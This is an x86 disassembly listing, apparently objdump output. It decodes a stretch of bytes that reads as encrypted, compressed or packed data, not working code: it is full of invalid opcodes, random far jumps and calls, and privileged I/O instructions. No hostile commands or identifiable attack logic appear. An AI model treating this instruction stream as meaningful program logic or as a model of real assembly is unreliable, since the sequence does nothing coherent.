  407f3d:	daa    
  407f3e:	mov    ds:0x197a70f9,al
  407f43:	lds    eax,FWORD PTR [ecx]
  407f45:	xchg   ebp,eax
  407f46:	lock pop edi
  407f48:	jae    0x407f56
  407f4a:	adc    al,0xd7
  407f4c:	add    dl,bh
  407f4e:	inc    esp
  407f4f:	dec    ebp
  407f50:	ret    0xbbe4
  407f53:	hlt    
  407f54:	aas    
  407f55:	daa    
  407f56:	loopne 0x407f83
  407f58:	int    0x78
  407f5a:	es xor eax,0xe9580f9e
  407f60:	test   eax,0x220aca12
  407f65:	xlat   BYTE PTR ds:[ebx]
  407f66:	push   esp
  407f67:	jo     0x407f2d
  407f69:	imul   ecx
  407f6b:	iret   
  407f6c:	xchg   edx,eax
  407f6d:	jmp    0xa384b95c
  407f72:	mov    ds:0x6fd283c5,eax
  407f77:	add    ebx,edx
  407f79:	add    al,0x2e
  407f7b:	push   ebx
  407f7c:	and    BYTE PTR [edx-0x5d],bh
  407f7f:	pop    eax
  407f80:	jno    0x407fd6
  407f82:	pop    ebp
  407f83:	push   0xbbd6eea3
  407f88:	pop    edi
  407f89:	xchg   esi,eax
  407f8a:	adc    DWORD PTR [eax],0x8ccbdcc1
  407f90:	jmp    0x825d:0x809edb9
  407f97:	fcmovu st,st(7)
  407f99:	cmp    dl,BYTE PTR [eax-0x65a002a2]
  407f9f:	jmp    0x407fa8
  407fa1:	icebp  
  407fa2:	push   ss
  407fa3:	xchg   ebp,eax
  407fa4:	test   BYTE PTR [esi],cl
  407fa6:	mov    ds:0xe1df475e,eax
  407fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fac:	push   ebp
  407fad:	hlt    
  407fae:	nop
  407faf:	sahf   
  407fb0:	lds    esp,FWORD PTR ds:0x4930a0de
  407fb6:	pushf  
  407fb7:	add    DWORD PTR [ecx-0x2e],eax
  407fba:	addr16 test eax,0x2975c075
  407fc0:	mov    ah,0xc
  407fc2:	mov    esi,0x5b33c9eb
  407fc7:	ret    
  407fc8:	es inc edx
  407fca:	scas   al,BYTE PTR es:[edi]
  407fcb:	and    BYTE PTR [edi-0x68ec52f0],bl
  407fd1:	int3   
  407fd2:	jmp    0x407fdd
  407fd4:	mov    ds:0xc5dbd22f,al
  407fd9:	cwde   
  407fda:	jp     0x407f82
  407fdc:	outs   dx,BYTE PTR ds:[esi]
  407fdd:	je     0x407f84
  407fdf:	pop    ss
  407fe0:	push   es
  407fe1:	jns    0x407f9c
  407fe3:	bound  edi,QWORD PTR [esp+ebp*1+0x56885c93]
  407fea:	imul   esp,DWORD PTR [ebx+0x3c],0x7aeb60b5
  407ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ff2:	ins    BYTE PTR es:[edi],dx
  407ff3:	jl     0x407ff3
  407ff5:	ja     0x407f8d
  407ff7:	mov    ebp,0xf70de02d
  407ffc:	sub    bh,dh
  407ffe:	mov    BYTE PTR [ebx],ah
  408000:	shl    DWORD PTR [ebx+0x70],cl
  408003:	pop    eax
  408004:	mov    ebx,0x8be32200
  408009:	sbb    dh,ah
  40800b:	in     eax,dx
  40800c:	add    eax,0x8400e1ec
  408011:	pop    ebx
  408012:	call   0xc5fc4ea9
  408017:	sti    
  408018:	popf   
  408019:	adc    bl,BYTE PTR [ecx]
  40801b:	mov    edx,0x97898caa
  408020:	xchg   esi,eax
  408021:	push   0x53
  408023:	jae    0x407fef
  408025:	sub    DWORD PTR [ebp+esi*1+0x68],esi
  408029:	fcomp  DWORD PTR [edi-0x6036a2de]
  40802f:	jge    0x408019
  408031:	lods   eax,DWORD PTR ds:[esi]
  408032:	or     esp,esp
  408034:	outs   dx,DWORD PTR ds:[esi]
  408035:	fiadd  DWORD PTR [ebp-0x56]
  408038:	loop   0x407fbf
  40803a:	mov    ch,0x3f
  40803c:	fadd   QWORD PTR [edi-0x37]
  40803f:	push   0x2590bfd0
  408044:	not    BYTE PTR [ecx+0x7a]
  408047:	push   es
  408048:	call   0xfe9c6808
  40804d:	sub    edi,DWORD PTR [edx+0x68be5dfa]
  408053:	arpl   WORD PTR [edx-0x1f],cx
  408056:	sub    al,0xe7
  408058:	rol    al,cl
  40805a:	pop    eax
  40805b:	sub    esi,edi
  40805d:	mov    ebp,DWORD PTR [edi+0x3d]
  408060:	mov    eax,0x71757fef
  408065:	adc    esi,DWORD PTR [ecx]
  408067:	xor    al,BYTE PTR [edi]
  408069:	add    al,0xff
  40806b:	(bad)  
  40806c:	shr    eax,0x9b
  40806f:	xor    al,0x81
  408071:	jg     0x4080e8
  408073:	cmp    eax,DWORD PTR [eax-0x35]
  408076:	push   ebx
  408077:	mov    ebp,0x429988ed
  40807c:	dec    BYTE PTR [eax+0x5af430c0]
  408082:	sub    eax,0x1a838d4d
  408087:	lods   eax,DWORD PTR ds:[esi]
  408088:	xlat   BYTE PTR ds:[ebx]
  408089:	ret    0x470d
  40808c:	jl     0x40803d
  40808e:	aad    0x1
  408090:	cmp    DWORD PTR [ebp+0x4a54977a],0xffffffb2
  408097:	pop    ss
  408098:	iret   
  408099:	mov    BYTE PTR [edi+0x510c28fe],dl
  40809f:	iret   
  4080a0:	cmc    
  4080a1:	xchg   edx,eax
  4080a2:	push   0x8da2649e
  4080a7:	lock fld QWORD PTR [ebp+0x7527bab6]
  4080ae:	jecxz  0x4080ec
  4080b0:	jbe    0x4080e1
  4080b2:	inc    ebx
  4080b3:	call   0x875:0x9f5f4b17
  4080ba:	das    
  4080bb:	jnp    0x4080a4
  4080bd:	dec    edx
  4080be:	mov    dl,0xca
  4080c0:	add    edi,DWORD PTR [eax-0x73]
  4080c3:	dec    edx
  4080c4:	jae    0x4080c6
  4080c6:	and    esp,esi
  4080c8:	mov    ch,0xf0
  4080ca:	daa    
  4080cb:	mov    ds:0x1055c406,eax
  4080d0:	in     al,dx
  4080d1:	xchg   esi,eax
  4080d2:	inc    esi
  4080d3:	add    BYTE PTR [ebp+0x39cf3e8f],ah
  4080d9:	in     eax,0x8d
  4080db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080dc:	ja     0x4080de
  4080de:	fs mov esp,0xd3aaa086
  4080e4:	gs mov esp,0xb3e5ba3d
  4080ea:	inc    edx
  4080eb:	cmp    esi,edx
  4080ed:	leave  
  4080ee:	imul   ecx,DWORD PTR [edx],0x74d6e587
  4080f4:	std    
  4080f5:	ds enter 0xf596,0xe0
  4080fa:	fnstsw WORD PTR [ecx]
  4080fc:	js     0x40813c
  4080fe:	ins    DWORD PTR es:[edi],dx
  4080ff:	inc    esp
  408100:	mov    BYTE PTR [esi+eax*2],bl
  408103:	jecxz  0x40809e
  408105:	ret    0x619
  408108:	push   edx
  408109:	sahf   
  40810a:	push   ebx
  40810b:	pop    ax
  40810d:	and    al,0xd
  40810f:	inc    esi
  408110:	js     0x4080fc
  408112:	inc    esi
  408113:	ficom  WORD PTR [edi]
  408115:	sub    DWORD PTR [esi],ecx
  408117:	iret   
  408118:	and    al,0xd9
  40811a:	call   0x78b:0x1fb0efd8
  408121:	daa    
  408122:	sub    ebp,DWORD PTR [ebx]
  408124:	cmp    BYTE PTR [edi-0x689d5068],ch
  40812a:	ja     0x4080d4
  40812c:	call   0x697c:0x770c481a
  408133:	outs   dx,DWORD PTR ds:[esi]
  408134:	icebp  
  408135:	push   ss
  408136:	ror    edx,0x74
  408139:	push   edx
  40813a:	leave  
  40813b:	add    eax,0xf5abd48a
  408140:	lds    ebp,FWORD PTR [ebp+0x4206677a]
  408146:	xchg   edi,eax
  408147:	mov    ebp,0xeb884747
  40814c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40814d:	(bad)  
  40814e:	ins    DWORD PTR es:[edi],dx
  40814f:	repnz test DWORD PTR [esi+0x700a43ab],eax
  408156:	push   esp
  408157:	xor    BYTE PTR [eax-0x775cd832],ah
  40815d:	js     0x408182
  40815f:	pusha  
  408160:	test   eax,0x38a2bb98
  408165:	cmp    BYTE PTR [edi+0x80a61a4],0x69
  40816c:	mov    eax,ds:0x45a3899a
  408171:	cmp    DWORD PTR [edx+0x6f],0xdc7a0319
  408178:	retf   0x3a36
  40817b:	or     BYTE PTR [ebx+0x36],ah
  40817e:	dec    ecx
  40817f:	pop    esp
  408180:	mov    ebp,0x19e54599
  408185:	jne    0x4081d1
  408187:	mov    dl,dl
  408189:	xor    eax,0x932e7767
  40818e:	in     al,0x2b
  408190:	xchg   edi,eax
  408191:	mov    eax,0x18abb4a
  408196:	in     eax,0x20
  408198:	xchg   edi,eax
  408199:	dec    esp
  40819a:	(bad)  
  40819b:	xchg   ecx,eax
  40819c:	pop    edi
  40819d:	ret    0x4114
  4081a0:	cs push cs
  4081a2:	sbb    BYTE PTR [esi],0x34
  4081a5:	jmp    0x40814d
  4081a7:	xchg   edi,eax
  4081a8:	mov    fs:0x40b05efe,eax
  4081ae:	bound  ecx,QWORD PTR [edx]
  4081b0:	in     eax,0x28
  4081b2:	mov    dh,dh
  4081b4:	rep ins DWORD PTR es:[edi],dx
  4081b6:	ja     0x408190
  4081b8:	jnp    0x40813d
  4081ba:	data16 and BYTE PTR [ebx+edi*4-0x74],cl
  4081bf:	hlt    
  4081c0:	stos   DWORD PTR es:[edi],eax
  4081c1:	bound  ecx,QWORD PTR [ecx+0x11]
  4081c4:	jae    0x4081d1
  4081c6:	shr    BYTE PTR [ecx],0xfd
  4081c9:	sbb    eax,0x916f16c3
  4081ce:	add    DWORD PTR [ecx],0xffffffae
  4081d1:	cmp    cl,dh
  4081d3:	jbe    0x408159
  4081d5:	xchg   ecx,eax
  4081d6:	nop
  4081d7:	adc    esp,DWORD PTR [ecx-0x2205419d]
  4081dd:	(bad)  
  4081de:	int    0x4a
  4081e0:	jp     0x4081f4
  4081e2:	lock or DWORD PTR [edi-0x71644aac],ebp
  4081e9:	aad    0x3
  4081eb:	xchg   edi,eax
  4081ec:	fdivr  DWORD PTR [eax]
  4081ee:	rol    DWORD PTR [ebx+0x489abe99],1
  4081f4:	fisttp DWORD PTR [ebx-0x57a693e3]
  4081fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081fb:	data16 jnp 0x4081a3
  4081fe:	das    
  4081ff:	push   ss
  408200:	arpl   WORD PTR [eax+eax*2-0x60],di
  408204:	nop
  408205:	sub    ch,BYTE PTR [edi-0x593b60a6]
  40820b:	jb     0x4081ac
  40820d:	jbe    0x408235
  40820f:	xor    BYTE PTR [edx+0x1ac7b6bb],0x11
  408216:	mov    esi,0x7cbabe6f
  40821b:	mov    edx,0xa84bf17e
  408220:	repz adc ah,BYTE PTR [edi]
  408223:	push   ecx
  408224:	sbb    DWORD PTR [esi+esi*1+0x560d041f],ebp
  40822b:	or     edi,DWORD PTR [edi+0x117e53cf]
  408231:	dec    eax
  408232:	imul   esp,DWORD PTR [esp+edx*4+0x3ea7c6f2],0x6c
  40823a:	adc    dl,BYTE PTR [eax-0x17cb639b]
  408240:	mov    bh,0xcd
  408242:	jp     0x4081ec
  408244:	push   0xaf0a5b41
  408249:	push   ss
  40824a:	ss hlt 
  40824c:	mov    dl,0xda
  40824e:	test   al,0x12
  408250:	test   BYTE PTR [esi+0x50a61e3],ch
  408256:	jb     0x4082a6
  408258:	pop    ebx
  408259:	xor    eax,DWORD PTR [eax-0x53]
  40825c:	out    dx,eax
  40825d:	xor    DWORD PTR [edx-0x2a57fd42],ecx
  408263:	sti    
  408264:	or     ecx,DWORD PTR [eax]
  408266:	and    BYTE PTR [ebx-0x13faa4c4],cl
  40826c:	pushf  
  40826d:	xlat   BYTE PTR ds:[ebx]
  40826e:	repnz push ecx
  408270:	dec    ebx
  408271:	ret    0x6e06
  408274:	sbb    DWORD PTR [eax],ebp
  408276:	pop    ss
  408277:	cdq    
  408278:	and    eax,0x6e970cac
  40827d:	aam    0xbd
  40827f:	push   esi
  408280:	jnp    0x4082a9
  408282:	sub    esp,eax
  408284:	xchg   bl,bh
  408286:	jp     0x4082e8
  408288:	pop    ss
  408289:	add    ebx,edx
  40828b:	or     al,0x78
  40828d:	fcomip st,st(2)
  40828f:	push   es
  408290:	call   0xa61e:0xdd79a225
  408297:	bound  ebp,QWORD PTR [ebx]
  408299:	mov    DWORD PTR [ebp-0x5944febc],esp
  40829f:	hlt    
  4082a0:	(bad)  
  4082a1:	cdq    
  4082a2:	frstor [esi-0x62]
  4082a5:	pushf  
  4082a6:	test   BYTE PTR [edx+eiz*4],0x9a
  4082aa:	mov    ebp,0x1e45b4fd
  4082af:	(bad)  
  4082b0:	cmp    eax,0x6cae7de9
  4082b5:	leave  
  4082b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082b7:	and    DWORD PTR [edx-0x7b],eax
  4082ba:	mov    dh,0xac
  4082bc:	adc    eax,0xf7512712
  4082c1:	push   0x7c6b6592
  4082c6:	pop    ecx
  4082c7:	lock jae 0x408297
  4082ca:	add    eax,0xa8060c3c
  4082cf:	ds in  eax,0x52
  4082d2:	nop
  4082d3:	and    DWORD PTR [edi+0x14be3e63],esp
  4082d9:	mov    bl,BYTE PTR [edx+0x42]
  4082dc:	jecxz  0x408325
  4082de:	or     ah,0x7a
  4082e1:	in     al,dx
  4082e2:	lahf   
  4082e3:	jns    0x408351
  4082e5:	(bad)  
  4082e6:	into   
  4082e7:	dec    edx
  4082e8:	push   cs
  4082e9:	ret    
  4082ea:	add    eax,DWORD PTR ds:0x4b3a493a
  4082f0:	push   edi
  4082f1:	out    dx,eax
  4082f2:	pop    esp
  4082f3:	sub    eax,0xc66e6864
  4082f8:	push   esi
  4082f9:	inc    ebx
  4082fa:	not    bl
  4082fc:	add    BYTE PTR es:0xa00abff,al
  408303:	test   al,0xd7
  408305:	mov    DWORD PTR [eax],edi
  408307:	ret    
  408308:	imul   edx,DWORD PTR [esi-0x4d1b8a53],0x28
  40830f:	std    
  408310:	enter  0x4fab,0x2b
  408314:	ja     0x4082f0
  408316:	dec    edx
  408317:	push   edi
  408318:	int3   
  408319:	shl    BYTE PTR [ecx],0x9
  40831c:	and    ecx,DWORD PTR ds:0x2dd28f67
  408322:	aad    0xc6
  408324:	push   0x3d
  408326:	pushf  
  408327:	jl     0x40832d
  408329:	cdq    
  40832a:	in     al,dx
  40832b:	jp     0x408384
  40832d:	enter  0xab30,0x40
  408331:	mov    edi,0xed8c8220
  408336:	imul   edx,DWORD PTR [ebx+0x2e40f59c],0x2
  40833d:	jle    0x4082e8
  40833f:	fiadd  DWORD PTR [edx-0xe0ced87]
  408345:	test   eax,0x82f326aa
  40834a:	pop    ecx
  40834b:	imul   esp,DWORD PTR [esp+ebp*8],0x39
  40834f:	rcl    BYTE PTR [esi+0x5efd2275],0xdd
  408356:	jnp    0x4083d1
  408358:	cmc    
  408359:	cld    
  40835a:	pop    ecx
  40835b:	sub    bh,BYTE PTR [ebp+0x7f25e7f6]
  408361:	jno    0x40832d
  408363:	inc    edx
  408364:	mov    ds:0xaba12b9e,al
  408369:	sub    dl,BYTE PTR [eax]
  40836b:	inc    edx
  40836c:	daa    
  40836d:	inc    ebx
  40836e:	or     al,0x6b
  408370:	xor    al,0xc1
  408372:	fwait
  408373:	jmp    0x4083e6
  408375:	in     eax,0xa7
  408377:	cmp    DWORD PTR [ecx+edi*1+0x2b8eb034],ecx
  40837e:	scas   al,BYTE PTR es:[edi]
  40837f:	fiadd  DWORD PTR [ebx-0x21]
  408382:	or     eax,0x7c212647
  408387:	cmp    edi,DWORD PTR [ebp+ebp*2-0x7e]
  40838b:	or     DWORD PTR [eax+0x62],esi
  40838e:	fisubr WORD PTR [ebp+0x37]
  408391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408392:	mov    eax,ds:0x180cbeb2
  408397:	sub    al,0xa3
  408399:	pop    esp
  40839a:	adc    DWORD PTR [esp+edi*8+0x33b09130],0xffffffa8
  4083a2:	mov    cl,0xb6
  4083a4:	sar    BYTE PTR [ebp+ecx*2+0x68107947],0x23
  4083ac:	xchg   edx,eax
  4083ad:	mov    ds,WORD PTR ds:0xe13a1d6
  4083b3:	jne    0x40838a
  4083b5:	js     0x408433
  4083b7:	pop    edx
  4083b8:	inc    ecx
  4083b9:	sbb    edi,DWORD PTR [esi]
  4083bb:	enter  0x549a,0xf3
  4083bf:	outs   dx,DWORD PTR ds:[esi]
  4083c0:	(bad)  
  4083c1:	rcr    DWORD PTR [eax-0x30],1
  4083c4:	mov    ?,ecx
  4083c6:	fild   QWORD PTR [ebx+0x61]
  4083c9:	fcmovne st,st(6)
  4083cb:	clc    
  4083cc:	enter  0xa0f4,0x1c
  4083d0:	adc    al,0x3b
  4083d2:	mov    dl,0xd1
  4083d4:	dec    esp
  4083d5:	pop    eax
  4083d6:	dec    ebx
  4083d7:	or     BYTE PTR [ecx+0x70],ch
  4083da:	sub    BYTE PTR [esi-0x56d82b87],0x21
  4083e1:	aam    0xd9
  4083e3:	xor    BYTE PTR [ecx+0x31],dh
  4083e6:	add    BYTE PTR [edi+0xe0804d2],ah
  4083ec:	cs inc edi
  4083ee:	and    al,ah
  4083f0:	ds mov ecx,eax
  4083f3:	sbb    eax,0x42c80078
  4083f8:	or     al,0x7e
  4083fa:	int    0x80
  4083fc:	out    dx,eax
  4083fd:	pop    ds
  4083fe:	mov    DWORD PTR fs:[esi],edi
  408401:	dec    edx
  408402:	xor    ebx,DWORD PTR [ecx+0x7429a53d]
  408408:	popf   
  408409:	adc    bh,bl
  40840b:	fldenv [ebx-0x26]
  40840e:	dec    esp
  40840f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408410:	outs   dx,DWORD PTR ds:[esi]
  408411:	mov    WORD PTR [edx+edi*1-0x77],gs
  408415:	dec    edi
  408416:	fisttp QWORD PTR [ecx-0x52a43e4f]
  40841c:	sub    ebp,DWORD PTR [edi-0x20519f06]
  408422:	test   eax,eax
  408424:	bnd ret 
  408426:	xchg   esp,eax
  408427:	adc    bh,BYTE PTR [esi-0x3b20532d]
  40842d:	fucom  st(6)
  40842f:	popf   
  408430:	sub    DWORD PTR [esi],edi
  408432:	cld    
  408433:	xor    BYTE PTR [ebx],0xe6
  408436:	pusha  
  408437:	aas    
  408438:	not    dl
  40843a:	gs jmp 0x408401
  40843d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40843e:	lods   eax,DWORD PTR ds:[esi]
  40843f:	(bad)
  408442:	into   
  408443:	or     eax,0x4125087c
  408448:	test   DWORD PTR [edx-0x20],eax
  40844b:	and    eax,0xdf4eb147
  408450:	push   0xf313ca27
  408455:	xchg   esi,eax
  408456:	fs in  eax,dx
  408458:	push   esi
  408459:	pop    eax
  40845a:	pop    ecx
  40845b:	xor    dl,BYTE PTR [eax+esi*4]
  40845e:	das    
  40845f:	adc    BYTE PTR ss:[esi],0xbb
  408463:	xchg   bl,al
  408465:	test   ah,al
  408467:	or     dh,dl
  408469:	ja     0x408412
  40846b:	out    0x81,eax
  40846d:	out    dx,eax
  40846e:	test   BYTE PTR [edi+0x6bc27b43],0x62
  408475:	test   DWORD PTR [edx+0x70],esi
  408478:	sbb    eax,0x6226c724
  40847d:	ret    0xe3b7
  408480:	jecxz  0x4084be
  408482:	(bad)  
  408483:	out    0x39,al
  408485:	dec    ebp
  408486:	xor    esi,0xffffffc0
  408489:	inc    ecx
  40848a:	sub    ch,BYTE PTR [eax-0x1d]
  40848d:	dec    edx
  40848e:	push   esi
  40848f:	(bad)  
  408491:	jnp    0x4084fe
  408493:	popf   
  408494:	int3   
  408495:	daa    
  408496:	repnz or BYTE PTR [ebx+0x5a126e38],dh
  40849d:	lods   al,BYTE PTR ds:[esi]
  40849e:	imul   esp,DWORD PTR [eax-0xf],0x4091b517
  4084a5:	jns    0x4084c6
  4084a7:	bound  edi,QWORD PTR [eax]
  4084a9:	sub    dh,BYTE PTR [esi]
  4084ab:	shl    ebp,cl
  4084ad:	adc    BYTE PTR [edi+0x42c224d8],bh
  4084b3:	repz xchg edi,eax
  4084b5:	mov    eax,0x204699cf
  4084ba:	jns    0x4084ea
  4084bc:	popa   
  4084bd:	jp     0x4084c9
  4084bf:	into   
  4084c0:	daa    
  4084c1:	add    al,0x4d
  4084c3:	or     BYTE PTR [ebx+0x52d2eae1],bh
  4084c9:	dec    esp
  4084ca:	cmp    BYTE PTR [ebp+0x1c],ah
  4084cd:	xchg   esp,eax
  4084ce:	test   BYTE PTR [edi+eiz*2-0x2d813c19],dl
  4084d5:	ret    
  4084d6:	repz loop 0x40846d
  4084d9:	leave  
  4084da:	adc    ah,BYTE PTR [esi+0x3edeef89]
  4084e0:	xchg   ebx,eax
  4084e1:	push   esp
  4084e2:	sbb    edx,DWORD PTR [edi]
  4084e4:	cli    
  4084e5:	jb     0x40854c
  4084e7:	mov    edx,0x5473f070
  4084ec:	aad    0xc
  4084ee:	dec    edx
  4084ef:	sbb    bl,BYTE PTR [edi]
  4084f1:	jb     0x4084dc
  4084f3:	dec    ebx
  4084f4:	fidivr WORD PTR [ecx+0x359543bb]
  4084fa:	imul   ebp,DWORD PTR [ecx-0x38a4e2e0],0xffffffcc
  408501:	push   es
  408502:	mov    WORD PTR [edi+0x38],ds
  408505:	mov    esp,0x7fc7f940
  40850a:	adc    al,0x22
  40850c:	test   eax,0x578f6af4
  408511:	gs in  al,0xf
  408514:	mov    esi,0x2217d908
  408519:	fdivr  DWORD PTR [ebx+esi*2-0x57bf63af]
  408520:	ins    DWORD PTR es:[edi],dx
  408521:	nop
  408522:	aad    0x17
  408524:	shr    eax,0x56
  408527:	mov    ds:0xb4667774,eax
  40852c:	and    DWORD PTR [ebp+0x76e84be9],ecx
  408532:	xlat   BYTE PTR ds:[ebx]
  408533:	pop    ebx
  408534:	lea    edi,[ecx]
  408536:	cmp    cl,al
  408538:	mov    esp,0xd423db00
  40853d:	mov    edi,0x9933db1c
  408542:	repnz imul esp,esi,0x26
  408546:	mov    esi,0x5f622e3b
  40854b:	pop    ebp
  40854c:	sub    edx,eax
  40854e:	les    ebx,FWORD PTR [ebx]
  408550:	sbb    al,0xa2
  408552:	xor    BYTE PTR [edi+0x23b0be8e],dh
  408558:	js     0x4084ec
  40855a:	jno    0x40859d
  40855c:	inc    DWORD PTR [edx-0x39]
  40855f:	xchg   ebp,eax
  408560:	add    DWORD PTR [ebx-0x66ddb991],ecx
  408566:	jmp    0x4085da
  408568:	(bad)  gs:[ecx+0x49]
  40856c:	lods   eax,DWORD PTR ds:[esi]
  40856d:	sbb    eax,0xa4cc26dd
  408572:	mov    ebp,0x57be559
  408577:	enter  0x2203,0xfb
  40857b:	add    ch,BYTE PTR [bp+di-0x2d]
  40857f:	add    esi,DWORD PTR [ecx-0x11]
  408582:	je     0x4085f5
  408584:	data16 fwait
  408586:	dec    edx
  408587:	xchg   ebp,eax
  408588:	dec    esp
  408589:	or     ch,ah
  40858b:	ins    DWORD PTR es:[edi],dx
  40858c:	mov    ebp,0x51eda1d2
  408591:	jg     0x408599
  408593:	mov    ah,0x68
  408595:	repnz (bad) 
  408597:	sahf   
  408598:	int    0x40
  40859a:	cmp    BYTE PTR [ebx-0x2c],bh
  40859d:	dec    ebx
  40859e:	mov    eax,ds:0x411fee99
  4085a3:	or     al,BYTE PTR [ebx-0x70]
  4085a6:	mov    ecx,0xb5567c21
  4085ab:	mov    bl,0x14
  4085ad:	call   0x825:0x43b0d7ff
  4085b4:	popa   
  4085b5:	repnz ins DWORD PTR es:[edi],dx
  4085b7:	mov    WORD PTR [ecx],fs
  4085b9:	(bad)  
  4085ba:	cmovbe edi,DWORD PTR [ebx+0x2c153249]
  4085c1:	ret    0x7e7f
  4085c4:	stos   DWORD PTR es:[edi],eax
  4085c5:	inc    esi
  4085c6:	add    bh,cl
  4085c8:	sahf   
  4085c9:	or     BYTE PTR [ebp+0x2],cl
  4085cc:	add    bh,ch
  4085ce:	mov    BYTE PTR [ecx],bl
  4085d0:	sub    ebx,edi
  4085d2:	push   edx
  4085d3:	ss xor eax,0x188b98cc
  4085d9:	rcpps  xmm4,XMMWORD PTR [ebp+0x4f]
  4085dd:	jae    0x40856e
  4085df:	jge    0x4085a1
  4085e1:	sbb    eax,0x3a199527
  4085e6:	cwde   
  4085e7:	dec    eax
  4085e8:	out    dx,eax
  4085e9:	div    DWORD PTR [eax+0x5d]
  4085ec:	(bad)  
  4085ed:	push   0xffffffeb
  4085ef:	xor    al,0x71
  4085f1:	addr16 ror ah,0x45
  4085f5:	test   BYTE PTR [ebp+0x49afa2d1],cl
  4085fb:	cmp    esi,ebp
  4085fd:	push   ebx
  4085fe:	cmp    cl,cl
  408600:	push   ecx
  408601:	xchg   ebx,eax
  408602:	dec    ecx
  408603:	jmp    0xb11c:0x4154b801
  40860a:	adc    ebx,edx
  40860c:	aam    0x15
  40860e:	imul   eax,DWORD PTR [ecx+ecx*2],0x69
  408612:	or     ebp,DWORD PTR [eax-0x4]
  408615:	aaa    
  408616:	(bad)  
  408617:	dec    edx
  408618:	scas   eax,DWORD PTR es:[edi]
  408619:	dec    esp
  40861a:	cdq    
  40861b:	sbb    BYTE PTR [esp+esi*1-0x70],0x95
  408620:	mov    esp,0xe7997d5d
  408626:	pop    edi
  408627:	jle    0x4086a1
  408629:	call   0xc1e64f0f
  40862e:	and    ecx,DWORD PTR [eax]
  408630:	addr16 stc 
  408632:	sbb    eax,0x8788ab25
  408637:	or     BYTE PTR [edi],bl
  408639:	pushf  
  40863a:	add    esi,DWORD PTR [ebp+0x19]
  40863d:	push   DWORD PTR [ebp-0x1d]
  408640:	sbb    BYTE PTR [ebx+0x77],0xf6
  408644:	pop    eax
  408645:	in     eax,0x53
  408647:	jmp    0xf624c6eb
  40864c:	bound  ebx,QWORD PTR [edi+edx*2-0x35]
  408650:	jl     0x4085e2
  408652:	repz fadd QWORD PTR [esi]
  408655:	mov    dh,0xef
  408657:	repz cmp al,0xe5
  40865a:	or     ebp,DWORD PTR [eax+0x6a]
  40865d:	and    cl,BYTE PTR [edx-0x61]
  408660:	and    ah,dl
  408662:	sub    BYTE PTR [ebp-0xf],cl
  408665:	fstp   DWORD PTR [ebx]
  408667:	std    
  408668:	out    0xf2,al
  40866a:	push   0x4e
  40866c:	jle    0x40865f
  40866e:	push   esp
  40866f:	out    0x70,eax
  408671:	fwait
  408672:	repz rol BYTE PTR [eax-0x45286c11],1
  408679:	mov    edi,0x9a7ed96f
  40867e:	into   
  40867f:	pop    edx
  408680:	fistp  DWORD PTR [edi-0x2d07a6e4]
  408686:	dec    esi
  408687:	or     edi,DWORD PTR [edx+0x5383a5e2]
  40868d:	retf   
  40868e:	jg     0x40863b
  408690:	adc    bp,0x18
  408694:	cdq    
  408695:	mov    BYTE PTR [edx],0x4d
  408698:	push   ecx
  408699:	popf   
  40869a:	xchg   edx,eax
  40869b:	mov    eax,DWORD PTR [eax-0x4e]
  40869e:	ins    DWORD PTR es:[edi],dx
  40869f:	and    eax,0xb01ff5e9
  4086a4:	mov    dl,0x68
  4086a6:	pop    edi
  4086a7:	(bad)  
  4086a8:	xchg   edi,eax
  4086a9:	mov    DWORD PTR [esi+0x7e],edi
  4086ac:	rol    DWORD PTR [esi-0x70],0x5b
  4086b0:	jne    0x408671
  4086b2:	xor    al,0x41
  4086b4:	mov    ch,0x37
  4086b6:	add    eax,0x1c5094e5
  4086bb:	sahf   
  4086bc:	iret   
  4086bd:	cmp    DWORD PTR [eax],ebx
  4086bf:	xchg   bl,ah
  4086c1:	std    
  4086c2:	sub    edi,DWORD PTR [eax-0x7216c3d9]
  4086c8:	mov    ds:0xaf3c9fdc,al
  4086cd:	mov    DWORD PTR [ebx-0x32],ebp
  4086d0:	cmp    eax,0xc3e325e1
  4086d5:	jb     0x40873a
  4086d7:	and    eax,0x23fce4b2
  4086dc:	adc    dl,BYTE PTR ds:[ebx+0x30a41502]
  4086e3:	ret    0xbb4a
  4086e6:	adc    al,0x64
  4086e8:	sub    eax,0x7c06527e
  4086ed:	push   esi
  4086ee:	sbb    ah,dl
  4086f0:	push   ebp
  4086f1:	test   eax,0x33fd043
  4086f6:	pusha  
  4086f7:	sahf   
  4086f8:	push   ebp
  4086f9:	adc    DWORD PTR [edx+0x41c6a6fd],edx
  4086ff:	mov    es,eax
  408701:	mov    al,ds:0x3389d111
  408706:	or     BYTE PTR [esi+ecx*4-0x48],0xef
  40870b:	call   0x9ce43aec
  408710:	inc    esi
  408711:	xchg   BYTE PTR [esi],bl
  408713:	aas    
  408714:	ror    DWORD PTR [edi],cl
  408716:	pop    edx
  408717:	cmp    DWORD PTR [edi-0x706a01a6],ebp
  40871d:	ret    
  40871e:	push   ebx
  40871f:	mov    esp,0xaa10e9f9
  408724:	push   cs
  408725:	push   ebp
  408726:	add    bh,bl
  408728:	pop    eax
  408729:	jge    0x4086ba
  40872b:	arpl   ax,dx
  40872d:	lods   eax,DWORD PTR ds:[esi]
  40872e:	sar    eax,1
  408730:	stos   DWORD PTR es:[edi],eax
  408731:	(bad)  
  408732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408733:	or     edi,esi
  408735:	(bad)  
  408736:	fimul  WORD PTR [edi]
  408738:	leave  
  408739:	push   ebx
  40873a:	sub    edx,DWORD PTR [ecx-0x715fa353]
  408740:	xor    ah,BYTE PTR [ebx+0x2e25e03c]
  408746:	sub    esi,esi
  408748:	pop    es
  408749:	mov    ebp,ecx
  40874b:	leave  
  40874c:	mov    cl,0x6e
  40874e:	or     DWORD PTR [eax+ebx*8+0x1b],edi
  408752:	jl     0x408717
  408754:	out    0x21,al
  408756:	shl    BYTE PTR [edi],0x0
  408759:	pop    DWORD PTR [edi-0xf]
  40875c:	sbb    eax,0xf7b49c5e
  408761:	outs   dx,DWORD PTR ds:[esi]
